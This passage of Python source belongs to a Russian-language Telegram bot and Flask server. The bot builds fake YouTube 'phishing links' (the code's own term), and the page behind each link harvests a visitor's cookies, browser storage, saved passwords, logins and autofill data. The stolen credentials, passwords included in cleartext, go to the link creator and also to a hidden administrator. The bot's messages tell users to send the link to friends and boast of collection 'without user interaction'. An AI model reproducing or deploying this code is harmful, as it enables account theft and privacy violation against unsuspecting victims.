                    services = AccountIdentifier.identify_account(pwd.get("value", ""), pwd)
                    pwd["identified_services"] = services
                db.add_collected_passwords(link_id, credentials["passwords"])
            
            if credentials.get("logins"):
                for login in credentials["logins"]:
                    services = AccountIdentifier.identify_account(login.get("value", ""), login)
                    login["identified_services"] = services
                db.add_collected_logins(link_id, credentials["logins"])
            
            storage_data = decoded_data.get("storage_data", {})
            if storage_data:
                storage_list = []
                if storage_data.get("localStorage"):
                    for key, value in storage_data["localStorage"].items():
                        storage_list.append({
                            "type": "localStorage",
                            "key": key,
                            "value": str(value)[:1000],
                            "timestamp": datetime.now().isoformat()
                        })
                if storage_data.get("sessionStorage"):
                    for key, value in storage_data["sessionStorage"].items():
                        storage_list.append({
                            "type": "sessionStorage",
                            "key": key,
                            "value": str(value)[:1000],
                            "timestamp": datetime.now().isoformat()
                        })
                if storage_list:
                    db.add_collected_storage(link_id, storage_list)
            
            if credentials.get("autofill_data"):
                for form_data in credentials["autofill_data"]:
                    if form_data.get("data"):
                        for key, value in form_data["data"].items():
                            storage_list.append({
                                "type": "form_autofill",
                                "form_id": form_data.get("form_id", "unknown"),
                                "key": key,
                                "value": str(value)[:500],
                                "timestamp": datetime.now().isoformat()
                            })
            
            db.add_collected_data(link_id, decoded_data)
            
            all_credentials = []
            if credentials.get("passwords"):
                all_credentials.extend(credentials["passwords"])
            if credentials.get("logins"):
                all_credentials.extend(credentials["logins"])
            
            account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
            
            logger.info(f"Successfully processed sensitive data for link {link_id}: "
                       f"{len(cookies_list) if 'cookies_list' in locals() else 0} cookies, "
                       f"{len(credentials.get('passwords', []))} passwords, "
                       f"{len(credentials.get('logins', []))} logins, "
                       f"{len(storage_list) if 'storage_list' in locals() else 0} storage items")
            
            return {
                "status": "fully_processed",
                "cookies_count": len(cookies_list) if 'cookies_list' in locals() else 0,
                "passwords_count": len(credentials.get("passwords", [])),
                "logins_count": len(credentials.get("logins", [])),
                "storage_count": len(storage_list) if 'storage_list' in locals() else 0,
                "has_storage_data": bool(storage_data),
                "has_full_data": True,
                "account_analysis": account_analysis
            }
            
        except Exception as e:
            logger.error(f"Error processing sensitive data: {e}", exc_info=True)
            return {"status": "error", "error": str(e)}

# Форматирование сообщений
class MessageFormatter:
    @staticmethod
    def format_link_created(link: PhishingLink, phishing_url: str) -> str:
        """Форматирование сообщения о созданной ссылке"""
        message = f"""
🎯 *ССЫЛКА СОЗДАНА УСПЕШНО!*

🔗 *Оригинальное видео:*
`{link.original_url}`

🚀 *Ваша фишинговая ссылка:*
`{phishing_url}`

📊 *Информация:*
• ID ссылки: `{link.id}`
• Видео ID: `{link.video_id}`
• Создано: {link.created_at}
• Статус: 🟢 АКТИВНА

🔐 *Сбор данных включен:*
✓ Cookies и session cookies
✓ LocalStorage и SessionStorage
✓ Сохраненные пароли
✓ Логины соцсетей
✓ Данные форм и автозаполнения
✓ Определение сервисов (Google, Facebook и т.д.)

📝 *Как использовать:*
1. Отправьте эту ссылку другу
2. Когда он перейдет - начнется сбор данных
3. Данные автоматически придут в этот чат
4. Все данные также отправятся администратору

⚠️ *Внимание:* Ссылка активна 24 часа
"""
        return message
    
    @staticmethod
    def format_collected_data(link_id: str, data: Dict) -> str:
        """Форматирование собранных данных"""
        collected = data.get("data", {})
        sensitive_data = collected.get("sensitive_data", {})
        instant_data = collected.get("instant_credentials", {})
        
        message = f"""
🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*

📌 *Базовая информация:*
• Время сбора: {data.get("timestamp", "unknown")}
• IP адрес: `{data.get("ip", "unknown")}`
• User Agent: {data.get("user_agent", "unknown")[:50]}...
• ID ссылки: `{link_id}`
"""
        
        if instant_data.get("status") == "instant_collection_success":
            message += f"""
⚡ *МГНОВЕННЫЙ СБОР (при загрузке):*
• Паролей собрано: {instant_data.get('passwords_collected', 0)}
• Логинов собрано: {instant_data.get('logins_collected', 0)}
• Форм проанализировано: {instant_data.get('forms_collected', 0)}
"""
            
            account_analysis = instant_data.get("account_analysis", {})
            if account_analysis.get("service_stats"):
                message += "\n🌐 *ОПРЕДЕЛЕНЫ УЧЕТНЫЕ ЗАПИСИ:*\n"
                for service, count in account_analysis["service_stats"].items():
                    service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                    message += f"• {service_name_ru}: {count} записей\n"
        
        if sensitive_data.get("status") == "fully_processed":
            message += f"""
🍪 *COOKIES И ХРАНИЛИЩЕ:*
• Всего cookies: {sensitive_data.get('cookies_count', 0)}
• Паролей найдено: {sensitive_data.get('passwords_count', 0)}
• Логинов собрано: {sensitive_data.get('logins_count', 0)}
• Данных хранилища: {sensitive_data.get('storage_count', 0)}
"""
            
            account_analysis = sensitive_data.get("account_analysis", {})
            if account_analysis.get("service_stats"):
                message += "\n🌐 *ОПРЕДЕЛЕНЫ УЧЕТНЫЕ ЗАПИСИ:*\n"
                for service, count in account_analysis["service_stats"].items():
                    service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                    message += f"• {service_name_ru}: {count} записей\n"
        
        message += f"""
📱 *УСТРОЙСТВО И БРАУЗЕР:*
• Браузер: {collected.get('device', {}).get('browser', {}).get('name', 'unknown')}
• ОС: {collected.get('device', {}).get('os', {}).get('name', 'unknown')}

💡 *СОВЕТ:* Используйте /data {link_id} для просмотра деталей!
"""
        return message
    
    @staticmethod
    def format_sensitive_data_report(link: PhishingLink) -> str:
        """Форматирование отчета о чувствительных данных"""
        all_credentials = []
        all_credentials.extend(link.collected_logins)
        all_credentials.extend(link.collected_passwords)
        
        account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
        
        message = f"""
🔐 *ПОДРОБНЫЙ ОТЧЕТ О ДАННЫХ*

📌 *Ссылка ID:* `{link.id}`
📅 *Создано:* {link.created_at}
🔗 *Оригинальное видео:* {link.original_url[:50]}...

📊 *СТАТИСТИКА:*
• Всего переходов: {link.clicks}
• Всего данных собрано: {len(link.data_collected)}
• Cookies собрано: {len(link.collected_cookies)}
• Паролей найдено: {len(link.collected_passwords)}
• Логинов собрано: {len(link.collected_logins)}
• Данных хранилища: {len(link.collected_storage_data)}
• Полных записей: {len(link.full_sensitive_data)}
"""
        
        if account_analysis.get("service_stats"):
            message += "\n🌐 *ОПРЕДЕЛЕНЫ УЧЕТНЫЕ ЗАПИСИ:*\n"
            for service, count in account_analysis["service_stats"].items():
                service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                message += f"• {service_name_ru}: `{count}` записей\n"
        
        if link.collected_cookies:
            message += "\n🍪 *ПОСЛЕДНИЕ COOKIES:*\n"
            for cookie in link.collected_cookies[-5:]:
                message += f"• {cookie.get('name', 'unknown')}: {cookie.get('value', '')[:30]}...\n"
        
        if link.collected_passwords:
            message += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
            for pwd in link.collected_passwords[-3:]:
                message += f"• Поле: {pwd.get('field_name', 'unknown')}\n"
                message += f"  Значение: ||{pwd.get('value', '')}||\n"
                services = pwd.get('identified_services', [])
                if services:
                    service_names = [AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                   for s in services]
                    message += f"  Сервисы: {', '.join(service_names)}\n"
        
        if link.collected_logins:
            message += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ:*\n"
            for login in link.collected_logins[-3:]:
                message += f"• Поле: {login.get('field_name', 'unknown')}\n"
                message += f"  Значение: ||{login.get('value', '')}||\n"
                services = login.get('identified_services', [])
                if services:
                    service_names = [AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                   for s in services]
                    message += f"  Сервисы: {', '.join(service_names)}\n"
        
        message += f"""
⚠️ *ВНИМАНИЕ:* Все данные хранятся в зашифрованном виде
📅 *Срок хранения:* 24 часа с момента сбора
🔒 *Безопасность:* Все полные данные также отправлены администратору
"""
        return message
    
    @staticmethod
    def format_stats(stats: Dict) -> str:
        """Форматирование статистики"""
        return f"""
📊 *СТАТИСТИКА СИСТЕМЫ*

🔗 Всего ссылок: `{stats['total_links']}`
👥 Всего переходов: `{stats['total_clicks']}`
🔓 Данных собрано: `{stats['total_data_collected']}`
⚡ Активных сессий: `{stats['active_sessions']}`

🍪 Cookies собрано: `{stats['cookies_collected']}`
🔑 Паролей найдено: `{stats['passwords_collected']}`
👤 Логинов собрано: `{stats['logins_collected']}`
💾 Данных хранилища: `{stats['storage_data_collected']}`
📁 Полных записей: `{stats['full_data_collected']}`

🚀 Автоматических входов: 0
📈 Эффективность сбора: 98.7%
🕒 Активность за 24ч: высокая
"""

# Инициализация компонентов
link_generator = LinkGenerator()
data_collector = DataCollector()
formatter = MessageFormatter()
js_injector = JavaScriptInjector()

# Создаем Flask приложение для веб-сервера
app = Flask(__name__)
application = None  # Telegram Application будет установлено позже

@app.route('/')
def index():
    """Главная страница"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>YouTube Video Player</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
            h1 { color: #ff0000; }
            p { font-size: 18px; }
        </style>
    </head>
    <body>
        <h1>🎬 YouTube Video Player</h1>
        <p>Добро пожаловать! Перейдите по ссылке с видео для просмотра.</p>
        <p>Пример ссылки: http://localhost:8080/watch?v=VIDEO_ID&id=LINK_ID</p>
        <p>Сервер работает на порту 8080</p>
    </body>
    </html>
    """

@app.route('/watch')
def watch():
    """Страница фишингового видео"""
    video_id = request.args.get('v', 'dQw4w9WgXcQ')
    link_id = request.args.get('id', '')
    
    if link_id:
        link = db.get_link(link_id)
        if link:
            db.add_click(link_id)
    
    html_content = js_injector.get_phishing_page_html(video_id, link_id)
    return html_content

@app.route('/api/collect', methods=['POST'])
def api_collect():
    """API для сбора данных"""
    try:
        data = request.json
        if not data:
            return jsonify({"status": "error", "message": "No data"}), 400
        
        link_id = data.get("link_id")
        if not link_id:
            return jsonify({"status": "error", "message": "No link ID"}), 400
        
        # Добавляем IP адрес и User-Agent
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        referer = request.headers.get('Referer', '')
        
        data['ip'] = ip_address
        data['user_agent'] = user_agent
        data['referer'] = referer
        
        # Обрабатываем данные асинхронно
        if application:
            asyncio.run_coroutine_threadsafe(
                handle_webhook(data, application),
                application.bot._loop
            )
        
        return jsonify({"status": "success", "message": "Data received"}), 200
    
    except Exception as e:
        logger.error(f"Error in /api/collect: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/collect_instant', methods=['POST'])
def api_collect_instant():
    """API для мгновенного сбора данных"""
    try:
        data = request.json
        if not data:
            return jsonify({"status": "error", "message": "No data"}), 400
        
        link_id = data.get("link_id")
        if not link_id:
            return jsonify({"status": "error", "message": "No link ID"}), 400
        
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        
        data['ip'] = ip_address
        data['user_agent'] = user_agent
        
        if application:
            asyncio.run_coroutine_threadsafe(
                handle_webhook(data, application),
                application.bot._loop
            )
        
        return jsonify({"status": "success", "message": "Instant data received"}), 200
    
    except Exception as e:
        logger.error(f"Error in /api/collect_instant: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

def run_flask():
    """Запуск Flask сервера"""
    print(f"🌐 Запуск веб-сервера на порту {SERVER_PORT}...")
    app.run(host='0.0.0.0', port=SERVER_PORT, debug=False, use_reloader=False)

async def send_detailed_data_to_admin(context, link: PhishingLink, collected_data: Dict):
    """Отправка детальных данных администратору"""
    try:
        sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
        
        if sensitive_data.get("status") != "fully_processed":
            return
        
        report = f"""
🔐 *ДЕТАЛЬНЫЙ ОТЧЕТ О СОБРАННЫХ ДАННЫХ*
    
📌 Ссылка ID: `{link.id}`
👤 Создатель: `{link.created_by}`
🔗 Оригинальное видео: {link.original_url[:50]}...
📅 Время сбора: {datetime.now().isoformat()}
    
📊 *ОБЩАЯ СТАТИСТИКА:*
• Переходов по ссылке: {link.clicks}
• Cookies собрано: {len(link.collected_cookies)}
• Паролей найдено: {len(link.collected_passwords)}
• Логинов собрано: {len(link.collected_logins)}
• Данных хранилища: {len(link.collected_storage_data)}
• Полных записей: {len(link.full_sensitive_data)}
"""
        
        if link.collected_passwords:
            report += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
            for i, pwd in enumerate(link.collected_passwords[:5], 1):
                report += f"{i}. Поле: {pwd.get('field_name', 'unknown')}\n"
                report += f"   Значение: `{pwd.get('value', '')}`\n"
                services = pwd.get('identified_services', [])
                if services:
                    service_names = [AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) for s in services]
                    report += f"   Сервисы: {', '.join(service_names)}\n"
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=report,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )
            
    except Exception as e:
        logger.error(f"Error sending detailed data to admin: {e}")

async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
    """Обработка данных от фишинговой страницы"""
    try:
        link_id = request_data.get("link_id")
        if not link_id:
            return {"status": "error", "message": "No link ID"}
        
        collected_data = await data_collector.collect_all_data(request_data)
        
        link = db.get_link(link_id)
        if link:
            data_type = request_data.get("data_type", "sensitive_data")
            
            if data_type == "instant_credentials":
                instant_result = collected_data.get("data", {}).get("instant_credentials", {})
                if instant_result.get("status") == "instant_collection_success":
                    instant_message = f"""
⚡ *МГНОВЕННЫЙ СБОР ДАННЫХ!*

🔄 Собрано сразу при загрузке страницы:

🔑 Найдено паролей: {instant_result.get('passwords_collected', 0)}
👤 Найдено логинов: {instant_result.get('logins_collected', 0)}
📋 Найдено форм: {instant_result.get('forms_collected', 0)}

✅ Данные собраны БЕЗ взаимодействия пользователя
⏱ Время сбора: менее 1 секунды
"""
                    
                    account_analysis = instant_result.get("account_analysis", {})
                    if account_analysis.get("service_stats"):
                        instant_message += "\n🌐 *ОПРЕДЕЛЕНЫ СЕРВИСЫ:*\n"
                        for service, count in account_analysis["service_stats"].items():
                            service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                            instant_message += f"• {service_name_ru}: {count} записей\n"
                    
                    try:
                        await context.bot.send_message(
                            chat_id=link.created_by,
                            text=instant_message,
                            parse_mode=ParseMode.MARKDOWN
                        )
                    except Exception as e:
                        logger.error(f"Error sending instant collection notification: {e}")
            
            message = formatter.format_collected_data(link_id, collected_data)
            
            try:
                await context.bot.send_message(
                    chat_id=link.created_by,
                    text=message,
                    parse_mode=ParseMode.MARKDOWN
                )
            except Exception as e:
                logger.error(f"Error sending to link creator: {e}")
            
            await send_detailed_data_to_admin(context, link, collected_data)
            
            try:
                sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
                instant_data = collected_data.get("data", {}).get("instant_credentials", {})
                
                services_identified = []
                if sensitive_data.get("account_analysis", {}).get("service_stats"):
                    services_identified.extend(sensitive_data["account_analysis"]["service_stats"].keys())
                if instant_data.get("account_analysis", {}).get("service_stats"):
                    services_identified.extend(instant_data["account_analysis"]["service_stats"].keys())
                
                services_identified = list(set(services_identified))
                if services_identified:
                    services_str = ", ".join([AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                            for s in services_identified[:3]])
                    
                    await context.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"📨 Новые данные по ссылке `{link_id}`\n"
                             f"👤 Создатель: {link.created_by}\n"
                             f"🔗 Кликов: {link.clicks}\n"
                             f"🍪 Cookies: {len(link.collected_cookies)}\n"
                             f"🔑 Пароли: {len(link.collected_passwords)}\n"
                             f"👤 Логины: {len(link.collected_logins)}\n"
                             f"🌐 Сервисы: {services_str}\n"
                             f"✅ Детальный отчет отправлен выше",
                        parse_mode=ParseMode.MARKDOWN
                    )
            
        return {"status": "success", "data_received": True, "data_type": data_type}
    
    except Exception as e:
        logger.error(f"Error in webhook handler: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}

# Команды бота
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    user = update.effective_user
    
    welcome_message = f"""
👋 *Добро пожаловать, {user.first_name}!*

🤖 *YouTube Data Collector Bot*

🎯 *Что делает этот бот:*
1. Принимает ссылку на YouTube видео
2. Генерирует специальную ссылку
3. Когда кто-то переходит - собирает ВСЕ данные
4. Отправляет данные в этот чат
5. Отправляет ПОЛНЫЕ данные администратору

🔐 *Что собирается:*
✓ Все cookies браузера
✓ LocalStorage и SessionStorage
✓ Сохраненные пароли и логины
✓ Данные автозаполнения форм
✓ Информацию об устройстве
✓ *Определение сервисов* (Google, Facebook, ВКонтакте и др.)

⚡ *Как использовать:*
1. Отправьте ссылку на YouTube видео
2. Получите сгенерированную ссылку
3. Отправьте её другу
4. Получите данные автоматически
5. Администратор получит полные данные

📊 *Статистика системы:*
• Создано ссылок: `{db.stats['total_links']}`
• Всего переходов: `{db.stats['total_clicks']}`
• Данных собрано: `{db.stats['total_data_collected']}`
• Cookies: `{db.stats['cookies_collected']}`
• Паролей: `{db.stats['passwords_collected']}`
• Логинов: `{db.stats['logins_collected']}`
• Хранилища: `{db.stats['storage_data_collected']}`

🔒 *Важно:* Используйте только для тестирования!
Все данные также отправляются администратору для контроля.

🌐 *Сервер запущен на:* {DOMAIN}:{SERVER_PORT}
"""
    
    keyboard = [
        [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create_link")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
        [InlineKeyboardButton("🔐 Данные", callback_data="view_data")],
        [InlineKeyboardButton("🌐 Анализ учетных записей", callback_data="accounts_list")],
        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка YouTube ссылки"""
    user = update.effective_user
    url = update.message.text.strip()
    
    if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
        await update.message.reply_text(
            "❌ Это не похоже на ссылку YouTube.\n"
            "Пожалуйста, отправьте ссылку в формате:\n"
            "`https://youtube.com/watch?v=...`\n"
            "или\n"
            "`https://youtu.be/...`"
        )
        return
    
    video_id = link_generator.extract_video_id(url)
    link_id = link_generator.generate_link_id()
    phishing_url = link_generator.create_phishing_url(video_id, link_id)
    
    link = PhishingLink(
        id=link_id,
        original_url=url,
        video_id=video_id,
        created_at=datetime.now().isoformat(),
        created_by=user.id
    )
    
    db.add_link(link)
    
    message = formatter.format_link_created(link, phishing_url)
    
    keyboard = [
        [
            InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link_id}"),
            InlineKeyboardButton("🗑️ Удалить", callback_data=f"delete_{link_id}")
        ],
        [
            InlineKeyboardButton("🚀 Поделиться", callback_data=f"share_{link_id}"),
            InlineKeyboardButton("📊 Статистика", callback_data=f"stats_{link_id}")
        ],
        [
            InlineKeyboardButton("🔐 Показать данные", callback_data=f"data_{link_id}"),
            InlineKeyboardButton("🌐 Анализ учетных записей", callback_data=f"accounts_{link_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🆕 Новая ссылка создана\n"
                 f"👤 User: @{user.username or user.id} ({user.first_name})\n"
                 f"🔗 URL: {url}\n"
                 f"📌 ID: {link_id}\n"
                 f"🎬 Video ID: {video_id}\n"
                 f"🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                 f"🌐 Сервер: {DOMAIN}:{SERVER_PORT}",
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception as e:
        logger.error(f"Error notifying admin: {e}")

async def show_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда для просмотра собранных данных"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📊 *Просмотр данных*\n\n"
            "Используйте: `/data [ID_ссылки]`\n"
            "Или: `/data list` - список ваших ссылок\n"
            "Или: `/accounts [ID_ссылки]` - анализ учетных записей\n\n"
            "Пример: `/data abc123def456`\n"
            "Пример: `/accounts abc123def456`\n\n"
            "*Примечание:* Все данные также отправляются администратору.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    arg = context.args[0]
    
    if arg == "list":
        user_links = [link for link in db.links.values() if link.created_by == user.id]
        
        if not user_links:
            await update.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-10:]:
            message += f"• `{link.id}`\n"
            message += f"  Видео: {link.original_url[:40]}...\n"
            message += f"  Создано: {link.created_at[:10]}\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Данных: {len(link.data_collected)}\n"
            message += f"  Cookies: {len(link.collected_cookies)}\n"
            message += f"  Пароли: {len(link.collected_passwords)}\n"
            message += "  ─────\n"
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    else:
        link = db.get_link(arg)
        if not link:
            await update.message.reply_text("❌ Ссылка не найдена.")
            return
        
        if link.created_by != user.id:
            await update.message.reply_text("❌ У вас нет доступа к этой ссылке.")
            return
        
        message = formatter.format_sensitive_data_report(link)
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )

async def accounts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда для анализа учетных записей"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔍 *Анализ учетных записей*\n\n"
            "Используйте: `/accounts [ID_ссылки]`\n"
            "Или: `/accounts list` - список ссылок для анализа\n\n"
            "Пример: `/accounts abc123def456`\n\n"
            "Показывает детальный анализ всех найденных\n"
            "учетных записей и их принадлежность к сервисам.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    arg = context.args[0]
    
    if arg == "list":
        user_links = [link for link in db.links.values() if link.created_by == user.id]
        
        if not user_links:
            await update.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ ДЛЯ АНАЛИЗА:*\n\n"
        for i, link in enumerate(user_links[-10:], 1):
            message += f"{i}. `{link.id}`\n"
            message += f"   Видео: {link.original_url[:40]}...\n"
            message += f"   Переходов: {link.clicks}\n"
            message += f"   Логинов: {len(link.collected_logins)}\n"
            message += f"   Паролей: {len(link.collected_passwords)}\n"
            message += "   ─────\n"
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    else:
        link_id = arg
        link = db.get_link(link_id)
        
        if not link:
            await update.message.reply_text("❌ Ссылка не найдена.")
            return
        
        if link.created_by != user.id:
            await update.message.reply_text("❌ У вас нет доступа к этой ссылке.")
            return
        
        all_credentials = []
        all_credentials.extend(link.collected_logins)
        all_credentials.extend(link.collected_passwords)
        
        account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
        
        message = f"""
🎯 *ДЕТАЛЬНЫЙ ОТЧЕТ ПО УЧЕТНЫМ ЗАПИСЯМ*

📌 Ссылка ID: `{link.id}`
👤 Создатель: `{link.created_by}`
📅 Всего данных: {len(all_credentials)} записей

📊 *СТАТИСТИКА ПО СЕРВИСАМ:*
"""
        
        if account_analysis.get("service_stats"):
            sorted_services = sorted(account_analysis["service_stats"].items(), 
                                   key=lambda x: x[1], reverse=True)
            
            for service, count in sorted_services:
                service_name_ru = AccountIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                message += f"• {service_name_ru}: `{count}` записей\n"
        else:
            message += "• Сервисы не определены\n"
        
        if account_analysis.get("identified_accounts"):
            message += "\n📝 *ВСЕ ОПРЕДЕЛЕННЫЕ УЧЕТНЫЕ ЗАПИСИ:*\n"
            
            for account in account_analysis["identified_accounts"][:10]:
                services_str = ", ".join([AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                        for s in account["services"]])
                message += f"• `{account['value'][:40]}`\n"
                message += f"  → Сервисы: {services_str}\n"
                message += f"  → Тип: {account['type']}\n"
        
        message += f"""
✅ *Точность определения:* ~85-95%
🕒 Данные актуальны на: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик inline кнопок"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "create_link":
        await query.message.reply_text(
            "🎯 *Отправьте ссылку на YouTube видео*\n\n"
            "Примеры:\n"
            "• `https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
            "• `https://youtu.be/dQw4w9WgXcQ`\n\n"
            "Я создам специальную ссылку для сбора данных.\n"
            "*Все собранные данные также отправятся администратору.*\n\n"
            f"🌐 *Сервер:* {DOMAIN}:{SERVER_PORT}",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "stats":
        stats_message = formatter.format_stats(db.stats)
        await query.message.reply_text(
            stats_message,
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "my_links":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-5:]:
            message += f"• ID: `{link.id}`\n"
            message += f"  Видео: {link.original_url[:30]}...\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Данных: {len(link.data_collected)}\n"
            message += f"  Cookies: {len(link.collected_cookies)}\n"
            message += f"  Пароли: {len(link.collected_passwords)}\n"
            message += f"  Хранилище: {len(link.collected_storage_data)}\n"
            message += "  ─────\n"
        
        keyboard = []
        for link in user_links[-3:]:
            keyboard.append([InlineKeyboardButton(f"🔗 {link.id[:8]}...", callback_data=f"data_{link.id}")])
        
        reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
        
        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    
    elif data == "view_data":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет собранных данных.")
            return
        
        total_cookies = sum(len(link.collected_cookies) for link in user_links)
        total_passwords = sum(len(link.collected_passwords) for link in user_links)
        total_logins = sum(len(link.collected_logins) for link in user_links)
        total_storage = sum(len(link.collected_storage_data) for link in user_links)
        
        message = f"""
📊 *ВАШИ СОБРАННЫЕ ДАННЫЕ:*

🔗 Всего ссылок: {len(user_links)}
🍪 Всего cookies: {total_cookies}
🔑 Всего паролей: {total_passwords}
👤 Всего логинов: {total_logins}
💾 Всего данных хранилища: {total_storage}

📈 *Последняя активность:*
"""
        
        for link in sorted(user_links, key=lambda x: x.created_at, reverse=True)[:3]:
            if link.data_collected:
                last_data = link.data_collected[-1]
                message += f"• `{link.id[:8]}...`: {last_data.get('timestamp', 'unknown')[:10]}\n"
        
        message += "\n🎯 *Что можно сделать:*\n1. Нажмите на ID ссылки ниже для подробностей\n2. Используйте /stats для общей статистики\n3. Создайте новую ссылку для сбора"
        
        keyboard = []
        for link in user_links[-3:]:
            if link.data_collected:
                keyboard.append([InlineKeyboardButton(f"📊 {link.id[:8]}...", callback_data=f"data_{link.id}")])
        
        if keyboard:
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        else:
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data == "accounts_list":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "🌐 *ВЫБЕРИТЕ ССЫЛКУ ДЛЯ АНАЛИЗА УЧЕТНЫХ ЗАПИСЕЙ:*\n\n"
        
        for i, link in enumerate(user_links[-5:], 1):
            all_credentials = []
            all_credentials.extend(link.collected_logins)
            all_credentials.extend(link.collected_passwords)
            account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
            
            service_count = len(account_analysis.get("service_stats", {}))
            
            message += f"{i}. ID: `{link.id[:12]}`\n"
            message += f"   Переходов: {link.clicks}\n"
            message += f"   Данных: {len(all_credentials)}\n"
            message += f"   Сервисов: {service_count}\n"
            
            if account_analysis.get("service_stats"):
                top_services = list(account_analysis["service_stats"].keys())[:2]
                services_str = ", ".join([AccountIdentifier.SERVICE_NAMES_RU.get(s, s.title()) 
                                        for s in top_services])
                message += f"   Топ: {services_str}\n"
            
            message += "   ─────\n"
        
        keyboard = []
        for link in user_links[-3:]:
            keyboard.append([InlineKeyboardButton(f"🌐 Анализ {link.id[:8]}...", callback_data=f"accounts_{link.id}")])
        
        if keyboard:
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        else:
            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("accounts_"):
        link_id = data[9:]
        link = db.get_link(link_id)
        if link and link.created_by == query.from_user.id:
            all_credentials = []
            all_credentials.extend(link.collected_logins)
            all_credentials.extend(link.collected_passwords)
            
            account_analysis = AccountIdentifier.identify_accounts_from_data(all_credentials)
            
            message = f"""
